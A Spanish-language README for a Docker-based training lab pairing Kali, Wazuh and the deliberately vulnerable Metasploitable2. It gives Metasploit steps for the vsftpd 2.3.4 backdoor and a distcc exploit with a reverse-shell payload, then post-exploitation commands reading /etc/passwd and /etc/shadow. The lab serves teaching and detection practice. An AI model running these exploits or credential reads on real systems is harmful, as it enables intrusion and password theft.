# Laboratorio 3: Metasploit + Metasploitable2 + Wazuh

Este paquete deja el laboratorio listo para ejecutar con Docker Compose, siguiendo la red usada en el informe:

- Kali atacante: `192.168.100.85`
- Wazuh monitor: `192.168.100.90`
- Metasploitable2 objetivo: `192.168.100.91`

## Estructura

- `docker-compose.yml`: levanta los tres servicios del laboratorio.
- `kali/Dockerfile`: construye una imagen Kali con herramientas necesarias.
- `kali/boot.sh`: script de arranque con chequeos y ayudas.
- `workspace/`: carpeta opcional para guardar evidencias, capturas y notas.

## Paso a paso

### 1. Crear carpeta de trabajo

```bash
mkdir -p workspace
```

### 2. Levantar el laboratorio

```bash
docker compose up -d --build
```

### 3. Verificar contenedores

```bash
docker ps
docker network inspect lab3_lab-net
```

Si el nombre del proyecto cambia, el nombre de red puede verse distinto. Lo importante es que los contenedores tengan estas IPs:

- `192.168.100.85`
- `192.168.100.90`
- `192.168.100.91`

### 4. Entrar a Kali

```bash
docker exec -it kali_attacker bash
```

### 5. Reconocimiento inicial

```bash
nmap -sV -O -p- 192.168.100.91
```

### 6. Explotación 1: vsftpd 2.3.4

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.91
run
```

### 7. Explotación 2: distcc

```bash
msfconsole
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.100.91
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.100.85
run
```

### 8. Post-explotación no destructiva

Ejemplos:

```bash
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow
```

### 9. Logs y limpieza

Logs de Wazuh:

```bash
docker logs wazuh_monitor
```

Detener todo:

```bash
docker compose down
```

Borrar también volúmenes:

```bash
docker compose down -v
```
